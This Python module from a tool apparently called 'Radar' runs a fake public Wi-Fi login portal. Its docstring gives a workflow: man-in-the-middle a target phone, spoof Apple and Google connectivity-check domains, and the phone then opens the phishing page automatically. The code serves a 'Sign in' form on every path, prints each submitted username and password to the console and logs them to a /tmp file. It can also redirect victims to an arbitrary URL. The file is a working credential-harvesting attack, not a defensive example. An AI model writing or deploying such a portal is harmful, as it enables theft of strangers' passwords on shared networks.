"""
Captive Portal — Automatic Browser Pop-up Trigger
===================================================
Runs a local web server that mimics a "public Wi-Fi login page."
When combined with DNS spoofing of connectivity-check domains
(captive.apple.com, connectivitycheck.gstatic.com), the target
device's OS will automatically pop up the browser showing this page.

WORKFLOW:
    1. Run `make intercept IP=<phone>`     — become MITM
    2. Run `make spoof IP=<phone> DOMAIN=captive.apple.com=<your_ip>`
    3. Run `make portal`                   — start this server
    4. The phone pops up a browser automatically.

Usage:
    sudo PYTHONPATH=. .venv/bin/python3 -m radar.fingerprint.portal
    sudo PYTHONPATH=. .venv/bin/python3 -m radar.fingerprint.portal --port 80 --title "Free WiFi"
"""

import sys
import logging
import argparse
from datetime import datetime

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Portal HTML Template
# ─────────────────────────────────────────────────────────────────────────────
PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
  }}
  .card {{
    background: rgba(255,255,255,0.08);
    backdrop-filter: blur(12px);
    border: 1px solid rgba(255,255,255,0.15);
    border-radius: 20px;
    padding: 48px 40px;
    max-width: 420px;
    width: 90%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
  }}
  .wifi-icon {{ font-size: 56px; margin-bottom: 16px; }}
  h1 {{ font-size: 1.6rem; font-weight: 600; margin-bottom: 8px; }}
  p {{ color: rgba(255,255,255,0.65); font-size: 0.95rem; margin-bottom: 28px; }}
  input {{
    width: 100%; padding: 14px 16px; border-radius: 10px;
    border: 1px solid rgba(255,255,255,0.2);
    background: rgba(255,255,255,0.1); color: #fff;
    font-size: 1rem; margin-bottom: 14px; outline: none;
  }}
  input::placeholder {{ color: rgba(255,255,255,0.4); }}
  button {{
    width: 100%; padding: 14px; border-radius: 10px; border: none;
    background: linear-gradient(135deg, #00b4d8, #0077b6);
    color: #fff; font-size: 1rem; font-weight: 600;
    cursor: pointer; transition: opacity 0.2s;
  }}
  button:hover {{ opacity: 0.88; }}
  .note {{ font-size: 0.75rem; color: rgba(255,255,255,0.35); margin-top: 20px; }}
</style>
</head>
<body>
<div class="card">
  <div class="wifi-icon">📶</div>
  <h1>{title}</h1>
  <p>Sign in to continue using this network.</p>
  <form method="POST" action="/submit">
    <input type="text"     name="username" placeholder="Username or Email" autocomplete="off" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Connect to Internet</button>
  </form>
  <p class="note">By connecting, you agree to our Terms of Service.</p>
</div>
</body>
</html>"""

SUBMITTED_HTML = """<!DOCTYPE html>
<html><head><title>Connected</title></head>
<body style="font-family:sans-serif;text-align:center;padding:80px;background:#0f2027;color:#fff;">
<h1>✅ You are now connected</h1>
<p style="color:rgba(255,255,255,0.6)">Enjoy your session.</p>
</body></html>"""


def build_app(title: str = "Network Login Required", redirect_url: str = None):
    """Creates and returns the FastAPI captive portal application."""
    from fastapi import FastAPI, Request, Form
    from fastapi.responses import HTMLResponse, RedirectResponse

    app = FastAPI(title="Radar Captive Portal")

    # Serve portal on ALL paths (catch-all for iOS/Android redirects)
    @app.api_route("/{path:path}", methods=["GET", "POST", "HEAD", "OPTIONS"])
    async def serve_portal(path: str, request: Request):
        if redirect_url:
            import re
            # Strip ANSI escape sequences (like terminal hyperlinks) that users might paste
            clean_url = re.sub(r'\x1b\[[0-9;]*m', '', redirect_url)
            clean_url = re.sub(r'\x1b\]8;;.*?\x1b\\\\', '', clean_url)
            clean_url = re.sub(r'\x1b\]8;;\x1b\\\\', '', clean_url)
            # If it's a raw hyperlink format, extract just the URL part
            match = re.search(r'(https?://[^\s]+)', clean_url)
            final_url = match.group(1) if match else clean_url
            
            # Proper HTTP 302 Redirect is required to trigger OS captive portal pop-ups
            return RedirectResponse(url=final_url, status_code=302)
        return HTMLResponse(content=PORTAL_HTML.format(title=title))

    @app.post("/submit", response_class=HTMLResponse)
    async def capture_credentials(
        request: Request,
        username: str = Form(default=""),
        password: str = Form(default=""),
    ):
        """Logs submitted credentials and shows success page."""
        client_ip = request.client.host if request.client else "unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Print to console (so operator sees them)
        print(f"\n📥 CREDENTIAL CAPTURE [{timestamp}]")
        print(f"   From    : {client_ip}")
        print(f"   Username: {username}")
        print(f"   Password: {password}")
        print()

        # Optionally write to a log file
        try:
            with open("/tmp/radar_portal_log.txt", "a") as f:
                f.write(f"[{timestamp}] {client_ip} | {username} | {password}\n")
        except Exception:
            pass

        return SUBMITTED_HTML

    return app


def start_portal(port: int = 8080, title: str = "Network Login Required", redirect_url: str = None):
    """Starts the captive portal server."""
    import uvicorn

    app = build_app(title=title, redirect_url=redirect_url)

    print(f"\n🌐 Captive Portal running on port {port}")
    print(f"   Title: {title}")
    print(f"   Credential log: /tmp/radar_portal_log.txt")
    print("\nPress Ctrl+C to stop.\n")

    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")


# ── Standalone CLI ────────────────────────────────────────────────────────────
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description="Radar Captive Portal")
    parser.add_argument("--port",  type=int, default=8080, help="Port to listen on (default: 8080)")
    parser.add_argument("--title", type=str, default="Network Login Required", help="Portal page title")
    parser.add_argument("--redirect", type=str, default=None, help="URL to redirect users to automatically")
    args = parser.parse_args()

    start_portal(port=args.port, title=args.title, redirect_url=args.redirect)
